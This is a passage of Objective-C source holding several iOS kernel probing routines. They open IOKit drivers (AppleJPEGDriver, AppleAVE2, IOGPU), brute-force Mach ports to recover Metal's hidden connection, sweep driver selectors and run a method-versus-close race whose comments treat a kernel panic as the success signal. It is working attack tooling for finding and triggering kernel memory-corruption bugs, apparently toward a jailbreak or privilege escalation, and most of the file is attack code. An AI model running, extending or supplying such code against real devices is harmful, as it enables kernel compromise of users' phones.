    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pCall || !pMainPort) {
        [out appendString:@"STOP dlsym\n"]; return out;
    }

    CFMutableDictionaryRef matching = pMatching("AppleJPEGDriver");
    io_service_t service = matching ? pGet(*pMainPort, matching) : 0;
    if (!service) { [out appendString:@"STOP no AppleJPEGDriver\n"]; return out; }
    io_connect_t conn = 0;
    kern_return_t kr = pOpen(service, mach_task_self(), 0, &conn);
    pRelease(service);
    [out appendFormat:@"IOServiceOpen: 0x%x\n", (unsigned)kr];
    if (kr != KERN_SUCCESS || !conn) { [out appendString:@"STOP open failed\n"]; return out; }

    enum { kStruct = 0x1000 };
    uint8_t *buf = calloc(1, kStruct);
    if (!buf) { pClose(conn); [out appendString:@"STOP calloc\n"]; return out; }

    uint32_t *u32 = (uint32_t *)buf;
    u32[0] = 64;
    u32[1] = 64;
    u32[5] = 64;
    u32[6] = 64;
    u32[0x12] = 1;
    *(uint32_t *)(buf + 0x80) = 0;
    *(uint8_t *)(buf + 0xba8) = 1;

    const uint32_t sels[] = {6, 16, 17, 18};
    const char *selNames[] = {"sel=6", "sel=16", "sel=17", "sel=18"};
    int nSels = (int)(sizeof(sels) / sizeof(sels[0]));
    for (int s = 0; s < nSels; s++) {
        uint32_t sel = sels[s];
        int anyNonBad = 0;
        for (uint32_t subcmd = 0; subcmd <= 3; subcmd++) {
            for (uint32_t cnt = 1; cnt <= 2; cnt++) {
                for (uint32_t sec = 0; sec <= 1; sec++) {
                    u32[0x14] = subcmd;
                    u32[0x15] = sec;
                    u32[0x16] = cnt;
                    uint8_t outStruct[kStruct];
                    memset(outStruct, 0, sizeof(outStruct));
                    size_t outCnt = kStruct;
                    kr = pCall(conn, sel, NULL, 0, buf, kStruct, NULL, NULL, outStruct, &outCnt);
                    if ((unsigned)kr != 0xe00002c2) {
                        anyNonBad = 1;
                        const char *sn = selNames[s];
                        [out appendFormat:@"  %s subcmd=%u cnt=%u sec=%u -> 0x%08x",
                               sn, subcmd, cnt, sec, (unsigned)kr];
                        if ((unsigned)kr == 0xe00002cc) [out appendString:@" (NoSpace)\n"];
                        else if ((unsigned)kr == 0) [out appendString:@" (SUCCESS!)\n"];
                        else [out appendString:@" (investigate!)\n"];
                    }
                }
            }
        }
        if (!anyNonBad) {
            const char *sn = selNames[s];
            [out appendFormat:@"  %s: all BadArgument (subcmd 0-3, cnt 1-2, sec 0-1)\n", sn];
        }
    }

    [out appendString:@"\nDONE -- paste this text back\n"];
    pClose(conn);
    free(buf);
    return out;
}

+ (NSString *)runP010MetalConnHunt {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 Metal conn hunt -- validate each candidate (non-MIG_BAD_ID)\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = iokit ? dlsym(iokit, "IOConnectCallMethod") : NULL;
    if (!pCall) { [out appendString:@"STOP dlsym\n"]; return out; }

    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    if (!mtl) { [out appendString:@"STOP no Metal\n"]; return out; }
    [out appendFormat:@"Metal: %@\n", [mtl name]];

    id<MTLCommandQueue> q = [mtl newCommandQueue];
    @autoreleasepool {
        id<MTLCommandBuffer> cmd = [q commandBuffer];
        [cmd commit];
        [cmd waitUntilCompleted];
    }
    [out appendString:@"cmd committed\n"];

    // Test a mach port as io_connect_t: sel=0, no args. MIG_BAD_ID = not a conn.
    __block io_connect_t found = 0;
    __block unsigned foundRc = 0xffffffff;
    void (^testCand)(uintptr_t, const char *) = ^(uintptr_t val, const char *src) {
        if (val == 0 || val >= 0x10000) return;
        if (found) return;
        kern_return_t r = pCall((io_connect_t)val, 0, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
        if ((unsigned)r != 0x10000003) {
            found = (io_connect_t)val;
            foundRc = (unsigned)r;
            [out appendFormat:@"REAL conn=%lu src=%s rc=0x%08x\n", (unsigned long)val, src, (unsigned)r];
        }
    };

    // 1) ivar scan: device, queue, buffer
    id objs[3];
    objs[0] = mtl;
    objs[1] = q;
    objs[2] = [mtl newBufferWithLength:4096 options:MTLResourceStorageModeShared];
    const char *objNames[] = {"dev", "queue", "buf"};
    for (int oi = 0; oi < 3; oi++) {
        id o = objs[oi];
        if (!o) continue;
        Class c = object_getClass(o);
        unsigned int cnt = 0;
        Ivar *ivs = class_copyIvarList(c, &cnt);
        for (unsigned i = 0; i < cnt; i++) {
            ptrdiff_t off = ivar_getOffset(ivs[i]);
            if (off <= 0) continue;
            uintptr_t v = *(uintptr_t *)((uintptr_t)(__bridge void *)o + off);
            testCand(v, objNames[oi]);
        }
        free(ivs);
    }

    // 2) raw memory scan: first 2048 bytes of device + queue, step 8
    for (int oi = 0; oi < 2 && !found; oi++) {
        id o = objs[oi];
        if (!o) continue;
        uintptr_t base = (uintptr_t)(__bridge void *)o;
        for (ptrdiff_t off = 0; off < 2048 && !found; off += 8) {
            uintptr_t v = *(uintptr_t *)(base + off);
            testCand(v, objNames[oi]);
        }
    }

    // 3) Mach port brute-force 0x100-0x8000
    if (!found) {
        for (mach_port_name_t pn = 0x100; pn < 0x8000 && !found; pn++) {
            mach_port_type_t pt = 0;
            mach_port_type(mach_task_self(), pn, &pt);
            if (pt & 1) testCand(pn, "portscan");
        }
    }

    if (!found) {
        [out appendString:@"STOP no real io_connect_t found\n"];
        return out;
    }

    [out appendFormat:@"using conn=%u rc=0x%08x\n", found, foundRc];
    // Quick sel sweep on the REAL conn
    for (uint32_t sel = 0; sel <= 10; sel++) {
        kern_return_t r = pCall(found, sel, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"sel=%u -> 0x%08x\n", sel, (unsigned)r];
        if ((unsigned)r != 0x10000003 && (unsigned)r != 0xe00002c2) {
            [out appendString:@" *** investigate ***\n"];
        }
    }
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010MetalRace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 Metal race -- method-vs-close N=1 on validated conn\n"];
    [out appendString:@"App crash = dead port (NOT race). Panic = race SIGNAL. Do NOT re-tap if panic.\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = iokit ? dlsym(iokit, "IOConnectCallMethod") : NULL;
    IOServiceClose_t pClose = iokit ? dlsym(iokit, "IOServiceClose") : NULL;
    if (!pCall || !pClose) { [out appendString:@"STOP dlsym\n"]; return out; }

    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    if (!mtl) { [out appendString:@"STOP no Metal\n"]; return out; }
    id<MTLCommandQueue> q = [mtl newCommandQueue];
    @autoreleasepool { id<MTLCommandBuffer> c = [q commandBuffer]; [c commit]; [c waitUntilCompleted]; }

    // Extract validated conn (same as conn hunt)
    __block io_connect_t conn = 0;
    void (^testCand)(uintptr_t) = ^(uintptr_t val) {
        if (val == 0 || val >= 0x10000 || conn) return;
        kern_return_t r = pCall((io_connect_t)val, 0, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
        if ((unsigned)r != 0x10000003) conn = (io_connect_t)val;
    };
    uintptr_t base = (uintptr_t)(__bridge void *)mtl;
    for (ptrdiff_t off = 0; off < 2048 && !conn; off += 8) testCand(*(uintptr_t *)(base + off));
    if (!conn) {
        for (mach_port_name_t pn = 0x100; pn < 0x8000 && !conn; pn++) {
            mach_port_type_t pt = 0; mach_port_type(mach_task_self(), pn, &pt);
            if (pt & 1) testCand(pn);
        }
    }
    if (!conn) { [out appendString:@"STOP no conn\n"]; return out; }
    [out appendFormat:@"race conn=%u\n", conn];

    // N=1 method-vs-close race
    __block unsigned lastCall = 0xffffffff, lastClose = 0xffffffff;
    dispatch_queue_t rq = dispatch_queue_create("p010.race", DISPATCH_QUEUE_CONCURRENT);
    dispatch_group_t g = dispatch_group_create();
    dispatch_group_async(g, rq, ^{
        uint64_t sout = 0; uint32_t sc = 1;
        lastCall = (unsigned)pCall(conn, 0, NULL, 0, NULL, 0, &sout, &sc, NULL, NULL);
    });
    dispatch_group_async(g, rq, ^{
        lastClose = (unsigned)pClose(conn);
    });
    dispatch_group_wait(g, dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC));

    [out appendFormat:@"lastCall=0x%08x lastClose=0x%08x\n", lastCall, lastClose];
    [out appendString:@"survived = race missed (or dead port). panic = race SIGNAL.\n"];
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010MultiConnSweep {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 multi-conn sweep -- scan dev+queue+buf, test each conn's sels\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = iokit ? dlsym(iokit, "IOConnectCallMethod") : NULL;
    if (!pCall) { [out appendString:@"STOP dlsym\n"]; return out; }

    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    if (!mtl) { [out appendString:@"STOP no Metal\n"]; return out; }
    id<MTLCommandQueue> q = [mtl newCommandQueue];
    id buf = [mtl newBufferWithLength:4096 options:MTLResourceStorageModeShared];
    @autoreleasepool { id<MTLCommandBuffer> c = [q commandBuffer]; [c commit]; [c waitUntilCompleted]; }

    id objs[3] = {mtl, q, buf};
    const char *objNames[] = {"dev", "queue", "buf"};

    // Collect ALL valid conns from all 3 objects (raw mem scan, first 4KB, step 8)
    io_connect_t conns[32];
    const char *connSrc[32];
    int nConns = 0;
    for (int oi = 0; oi < 3; oi++) {
        if (!objs[oi]) continue;
        uintptr_t base = (uintptr_t)(__bridge void *)objs[oi];
        for (ptrdiff_t off = 0; off < 4096 && nConns < 32; off += 8) {
            uintptr_t val = *(uintptr_t *)(base + off);
            if (val == 0 || val >= 0x10000) continue;
            // Check if already found
            int dup = 0;
            for (int k = 0; k < nConns; k++) if (conns[k] == (io_connect_t)val) { dup = 1; break; }
            if (dup) continue;
            kern_return_t r = pCall((io_connect_t)val, 0, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
            if ((unsigned)r != 0x10000003) {
                conns[nConns] = (io_connect_t)val;
                connSrc[nConns] = objNames[oi];
                nConns++;
                [out appendFormat:@"conn[%d]=%u src=%s off~0x%tx rc=0x%08x\n",
                 nConns-1, (unsigned)val, objNames[oi], off, (unsigned)r];
            }
        }
    }
    [out appendFormat:@"total valid conns: %d\n", nConns];
    if (!nConns) { [out appendString:@"STOP no conns\n"]; return out; }

    // For each conn, sweep sel 0-55 with input struct
    uint8_t inStruct[0x1000];
    memset(inStruct, 0, sizeof(inStruct));
    *(uint32_t *)(inStruct + 0) = 64;
    *(uint32_t *)(inStruct + 4) = 64;
    *(uint32_t *)(inStruct + 8) = 4;
    *(uint32_t *)(inStruct + 12) = 256;
    *(uint32_t *)(inStruct + 16) = 16384;
    *(uint64_t *)(inStruct + 0x30) = 1;
    *(uint64_t *)(inStruct + 0x38) = 1;
    uint8_t outStruct[0x1000];
    int anyNonBad = 0;
    for (int ci = 0; ci < nConns; ci++) {
        int connNonBad = 0;
        for (uint32_t sel = 0; sel < 56; sel++) {
            size_t outCnt = sizeof(outStruct);
            kern_return_t r = pCall(conns[ci], sel, NULL, 0, inStruct, sizeof(inStruct),
                                    NULL, NULL, outStruct, &outCnt);
            unsigned ur = (unsigned)r;
            if (ur != 0xe00002c2) {
                connNonBad++; anyNonBad++;
                [out appendFormat:@"conn[%d]=%u sel=%u -> 0x%08x outCnt=%zu\n",
                 ci, conns[ci], sel, ur, outCnt];
            }
        }
        if (connNonBad) [out appendFormat:@"  conn[%d] (%s): %d non-Bad sels\n", ci, connSrc[ci], connNonBad];
    }
    [out appendFormat:@"total non-BadArgument results: %d\n", anyNonBad];
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP008Sel5SubCmdSweep {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P008 sel=5 sub-command sweep -- correct offsets + struct[0xd0]=0-25\n"];
    [out appendString:@"RE: srcID@0x2ac dstID@0x2b0 pixelsX@0x428 pixelsY@0x42c subcmd@0xd0 cnt@0xd8 sec@0xd4\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosH) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pCall || !pMainPort ||
        !iosCreate || !iosGetID) { [out appendString:@"STOP dlsym\n"]; return out; }

    NSDictionary *sp = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @(64*4),
        @"IOSurfaceAllocSize": @(64*64*4),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    IOSurfaceRef src = iosCreate((__bridge CFDictionaryRef)sp);
    IOSurfaceRef dst = iosCreate((__bridge CFDictionaryRef)sp);
    if (!src || !dst) { [out appendString:@"STOP surface\n"]; return out; }
    uint32_t srcID = iosGetID(src), dstID = iosGetID(dst);
    [out appendFormat:@"src=%u dst=%u\n", srcID, dstID];

    io_service_t svc = pGet(*pMainPort, pMatching("AppleJPEGDriver"));
    if (!svc) { [out appendString:@"STOP service\n"]; return out; }
    io_connect_t conn = 0;
    kern_return_t kr = pOpen(svc, mach_task_self(), 0, &conn);
    pRelease(svc);
    if (kr != KERN_SUCCESS) { [out appendFormat:@"OPEN FAIL 0x%x\n", kr]; return out; }
    [out appendFormat:@"conn=%u\n", conn];

    enum { kStruct = 0x1000 };
    int nonBad = 0;
    // sel=5 is cited startDecoder. Sweep sub-command 0-25 at struct[0xd0].
    for (uint32_t subcmd = 0; subcmd <= 25; subcmd++) {
        uint8_t *buf = calloc(1, kStruct);
        *(uint32_t *)(buf + 0x2ac) = srcID;
        *(uint32_t *)(buf + 0x2b0) = dstID;
        *(uint32_t *)(buf + 0x428) = 64;   // pixelsX
        *(uint32_t *)(buf + 0x42c) = 64;   // pixelsY
        *(uint32_t *)(buf + 0x80) = 0;     // startOfRawBitStream
        *(uint32_t *)(buf + 0xd0) = subcmd;
        *(uint32_t *)(buf + 0xd4) = 0;     // secondary
        *(uint32_t *)(buf + 0xd8) = 1;     // count

        uint8_t outS[kStruct]; size_t outC = sizeof(outS);
        kern_return_t r = pCall(conn, 5, NULL, 0, buf, kStruct, NULL, NULL, outS, &outC);
        unsigned ur = (unsigned)r;
        free(buf);
        if (ur == 0xe00002c2) continue; // skip BadArgument
        nonBad++;
        [out appendFormat:@"sel=5 subcmd=%u -> 0x%08x", subcmd, ur];
        if (ur == 0) [out appendString:@" OK!"];
        else if (ur == 0xe00002cc) [out appendString:@" NoSpace"];
        else [out appendString:@" NEW!"];
        [out appendFormat:@" outCnt=%zu\n", outC];
    }
    [out appendFormat:@"non-BadArgument subcmds: %d\n", nonBad];
    pClose(conn);
    CFRelease(src); CFRelease(dst);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010PortScanSweep {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 Mach port scan -- test EVERY port as io_connect_t\n"];
    [out appendString:@"IOGPUDeviceUserClient conn should be in our port space.\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = iokit ? dlsym(iokit, "IOConnectCallMethod") : NULL;
    if (!pCall) { [out appendString:@"STOP dlsym\n"]; return out; }

    // Metal warm-up (opens AGX + IOGPUDeviceUserClient internally)
    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    if (!mtl) { [out appendString:@"STOP no Metal\n"]; return out; }
    id<MTLCommandQueue> q = [mtl newCommandQueue];
    id buf = [mtl newBufferWithLength:4096 options:MTLResourceStorageModeShared];
    @autoreleasepool { id<MTLCommandBuffer> c = [q commandBuffer]; [c commit]; [c waitUntilCompleted]; }

    // Diagnostic: enumerate ALL ports in our task with their types (NO IOConnectCallMethod -- safe)
    int nPorts = 0;
    for (mach_port_name_t pn = 0x100; pn < 0x10000; pn++) {
        mach_port_type_t pt = 0;
        kern_return_t mpt = mach_port_type(mach_task_self(), pn, &pt);
        if (mpt != KERN_SUCCESS) continue;
        nPorts++;
        [out appendFormat:@"port=%u pt=0x%x\n", pn, pt];
    }
    [out appendFormat:@"total ports in task: %d\n", nPorts];

    // Also: dump IOGPU.framework symbols available
    [out appendString:@"\n--- IOGPU.framework symbols ---\n"];
    void *gpufw = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!gpufw) gpufw = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!gpufw) { [out appendString:@"no IOGPU fw\n"]; }
    else {
        const char *symNames[] = {
            "IOGPUResourceReplaceBackingWithBytes",
            "IOGPUResourceGetResourceType",
            "IOGPUResourceGetGPUVirtualAddress",
            "IOGPUResourceGetGPUVirtualAddressLength",
            "IOGPUDeviceCreate",
            "IOGPUDeviceDestroy",
            "IOGPUCommandQueueCreate",
            "IOGPUCommandQueueDestroy",
            "IOGPUClientCreate",
            "IOGPUClientDestroy",
            "IOGPUNewResource",
            "IOGPUFreeResource",
            "IOGPUNewCommandQueue",
            "IOGPUFreeCommandQueue",
            "IOGPUSubmitCommandBuffers",
            "IOGPUMapResource",
            "IOGPUUnmapResource",
            "IOGPUResourceSetGPUVirtualAddress",
            "IOGPUResourceGetGPUVirtualAddress",
            "IOGPUResourceGetGPUVirtualAddressLength",
            "IOGPUResourceGetResourceType",
            "IOGPUResourceReplaceBacking",
            "IOGPUResourceReplaceBackingWithBytes",
            "IOGPUGetCapabilities",
        };
        int nSyms = (int)(sizeof(symNames) / sizeof(symNames[0]));
        int nFound = 0;
        for (int si = 0; si < nSyms; si++) {
            void *sym = dlsym(gpufw, symNames[si]);
            if (sym) { nFound++; [out appendFormat:@"  %@\n", [NSString stringWithUTF8String:symNames[si]]]; }
        }
        [out appendFormat:@"IOGPU symbols found: %d/%d\n", nFound, nSyms];
    }

    // Test all SEND-right ports (bits are shifted by 16: 0x10000=SEND, 0x80000=DEAD)
    io_connect_t conns[64];
    int nConns = 0;

    // P001: try AppleAVE2 open (completely different driver, different primitives)
    [out appendString:@"--- P001 AVE open ---\n"];
    IOServiceMatching_t pMatch = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGetSvc = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpenSvc = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pCloseSvc = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRel = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMP = dlsym(iokit, "kIOMainPortDefault");
    if (!pMP) pMP = dlsym(iokit, "kIOMasterPortDefault");

    if (pMatch && pGetSvc && pOpenSvc && pCloseSvc && pRel && pMP) {
        const char *aveNames[] = {"AppleAVE2", "AppleAVE2H1", "AppleAVE2FW", "AppleAVE"};
        for (int ai = 0; ai < 4; ai++) {
            io_service_t svc = pGetSvc(*pMP, pMatch(aveNames[ai]));
            if (!svc) { [out appendFormat:@"%@: no match\n", [NSString stringWithUTF8String:aveNames[ai]]]; continue; }
            io_connect_t c = 0;
            kern_return_t kr = pOpenSvc(svc, mach_task_self(), 0, &c);
            pRel(svc);
            [out appendFormat:@"%@: open 0x%08x conn=%u\n", [NSString stringWithUTF8String:aveNames[ai]], (unsigned)kr, c];
            if (kr == 0 && c) {
                // Sweep selectors 0-55 with struct input
                uint8_t inS[0x1000]; memset(inS, 0, sizeof(inS));
                *(uint32_t *)(inS+0) = 64; *(uint32_t *)(inS+4) = 64;
                uint8_t outS[0x1000];
                int nb = 0;
                for (uint32_t sel = 0; sel < 56; sel++) {
                    size_t oc = sizeof(outS);
                    kern_return_t r = pCall(c, sel, NULL, 0, inS, sizeof(inS), NULL, NULL, outS, &oc);
                    if ((unsigned)r != 0xe00002c2) {
                        nb++;
                        [out appendFormat:@"  sel=%u -> 0x%08x outC=%zu\n", sel, (unsigned)r, oc];
                    }
                }
                [out appendFormat:@"  non-Bad sels: %d\n", nb];
                pCloseSvc(c);
            }
        }
    }
    [out appendFormat:@"total IOKit conns: %d\n", nConns];
    if (!nConns) { [out appendString:@"STOP no conns\n"]; return out; }

    // For each conn, sweep sel 0-55 with 0x1000 struct
    uint8_t inStruct[0x1000];
    memset(inStruct, 0, sizeof(inStruct));
    *(uint32_t *)(inStruct + 0) = 64;
    *(uint32_t *)(inStruct + 4) = 64;
    *(uint32_t *)(inStruct + 16) = 16384;
    uint8_t outS[0x1000];
    for (int ci = 0; ci < nConns; ci++) {
        int nonBad = 0;
        for (uint32_t sel = 0; sel < 56; sel++) {
            size_t outC = sizeof(outS);
            kern_return_t r = pCall(conns[ci], sel, NULL, 0, inStruct, sizeof(inStruct),
                                    NULL, NULL, outS, &outC);
            unsigned ur = (unsigned)r;
            if (ur != 0xe00002c2) {
                nonBad++;
                [out appendFormat:@"conn[%d]=%u sel=%u -> 0x%08x outC=%zu\n",
                 ci, conns[ci], sel, ur, outC];
            }
        }
        if (nonBad) [out appendFormat:@"  conn[%d]: %d non-Bad sels\n", ci, nonBad];
    }
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP001AVEOpenProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P001 AVE open probe -- test AppleAVE2 on 18.7.5\n"];
    [out appendString:@"On 26.5/26.6: NotPermitted. On 18.7.5: no sandbox gate (per RE).\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pMainPort) {
        [out appendString:@"STOP dlsym\n"]; return out;
    }

    const char *svcNames[] = {
        "AppleAVE2",
        "AppleAVE2Driver",
        "AppleAVEH2",
        "AppleAVE",
        "IOPlatformExpertDevice",
    };
    int nNames = (int)(sizeof(svcNames) / sizeof(svcNames[0]));

    for (int si = 0; si < nNames; si++) {
        CFMutableDictionaryRef m = pMatching(svcNames[si]);
        if (!m) { [out appendFormat:@"%@: matching fail\n", [NSString stringWithUTF8String:svcNames[si]]]; continue; }
        io_service_t svc = pGet(*pMainPort, m);
        if (!svc) { [out appendFormat:@"%@: not found\n", [NSString stringWithUTF8String:svcNames[si]]]; continue; }
        [out appendFormat:@"%@: FOUND\n", [NSString stringWithUTF8String:svcNames[si]]];

        for (uint32_t type = 0; type <= 5; type++) {
            io_connect_t conn = 0;
            kern_return_t kr = pOpen(svc, mach_task_self(), type, &conn);
            [out appendFormat:@"  type=%u -> 0x%08x", type, (unsigned)kr];
            if (kr == KERN_SUCCESS && conn) {
                [out appendFormat:@" conn=%u SUCCESS", conn];
                pClose(conn);
            } else if ((unsigned)kr == 0xe00002e2) [out appendString:@" NotPermitted"];
            else if ((unsigned)kr == 0xe00002c7) [out appendString:@" NotAccessible"];
            else if ((unsigned)kr == 0xe00002cc) [out appendString:@" NoSpace"];
            [out appendString:@"\n"];
        }
        pRelease(svc);
    }

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"SUCCESS = AVE opens on 18.7.5 -- new IOKit surface to explore.\n"];
    return out;
}

+ (NSString *)runP010IOGPUDeviceCreate {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 IOGPUDeviceCreate -- direct framework call\n"];
    [out appendString:@"RE: IOGPUDeviceCreate calls IOServiceOpen(svc, self, type=1, &conn).\n"];
    [out appendString:@"Previous hang was type=0 on wrong service. Type=1 = Metal path.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    DevCreate_t pDevCreate = iogpu ? (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate") : NULL;
    GetConn_t pGetConn = iogpu ? (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect") : NULL;
    DevRelease_t pDevRelease = iogpu ? (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease") : NULL;

    [out appendFormat:@"IOGPU.fw: handle=%p create=%p getConn=%p release=%p\n",
        iogpu, pDevCreate, pGetConn, pDevRelease];

    // Try multiple service names -- "IOGPU" matched before (hung at type=0, not matching)
    const char *svcNames[] = { "IOGPU", "AGXAccelerator", "AppleAGXAccelerator", "IOGPUDevice" };
    int nNames = (int)(sizeof(svcNames) / sizeof(svcNames[0]));
    io_service_t svc = 0;
    for (int si = 0; si < nNames && !svc; si++) {
        CFMutableDictionaryRef m = pMatching(svcNames[si]);
        if (!m) continue;
        svc = pGet(*pMainPort, m);
        if (svc) [out appendFormat:@"service '%s' -> FOUND (%u)\n", svcNames[si], svc];
    }
    if (!svc) { [out appendString:@"STOP no service (tried all names)\n"]; [out appendString:@"\nDONE -- paste this text back\n"]; return out; }

    io_connect_t conn = 0;
    void *dev = NULL;

    if (pDevCreate && pGetConn) {
        dev = pDevCreate(svc);
        [out appendFormat:@"IOGPUDeviceCreate -> %p\n", dev];
        if (dev) {
            conn = pGetConn(dev);
            [out appendFormat:@"IOGPUDeviceGetConnect -> conn=%u\n", conn];
        } else {
            [out appendString:@"IOGPUDeviceCreate returned NULL -- trying direct open\n"];
        }
    }

    if (!conn) {
        [out appendString:@"Direct IOServiceOpen type=1...\n"];
        kern_return_t kr = pOpen(svc, mach_task_self(), 1, &conn);
        [out appendFormat:@"IOServiceOpen(type=1) -> 0x%08x conn=%u\n", (unsigned)kr, conn];
        if (kr != KERN_SUCCESS) conn = 0;
    }

    if (!conn) {
        [out appendString:@"STOP no conn\n"];
        pRelease(svc);
        [out appendString:@"\nDONE -- paste this text back\n"];
        return out;
    }

    [out appendFormat:@"\n--- selector sweep conn=%u ---\n", conn];
    void *inS = calloc(1, 0x1000);
    void *outS = calloc(1, 0x1000);
    int nonBad = 0;
    for (uint32_t sel = 0; sel < 56; sel++) {
        size_t oc = 0x1000;
        kern_return_t r = pCall(conn, sel, NULL, 0, inS, 0x1000, NULL, NULL, outS, &oc);
        unsigned ur = (unsigned)r;
        if (ur == 0xe00002c2) continue;
        nonBad++;
        [out appendFormat:@"sel=%u -> 0x%08x", sel, ur];
        if (ur == 0) [out appendString:@" OK"];
        else if (ur == 0xe00002cc) [out appendString:@" NoSpace"];
        else if (ur == 0xe00002e2) [out appendString:@" NotPermitted"];
        else [out appendString:@" NEW"];
        [out appendString:@"\n"];
    }
    free(inS); free(outS);
    [out appendFormat:@"non-BadArg selectors: %d\n", nonBad];

    if (dev && pDevRelease) pDevRelease(dev);
    else if (conn) pClose(conn);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"non-Bad = found IOGPUDeviceUserClient conn. Race those sels.\n"];
    return out;
}

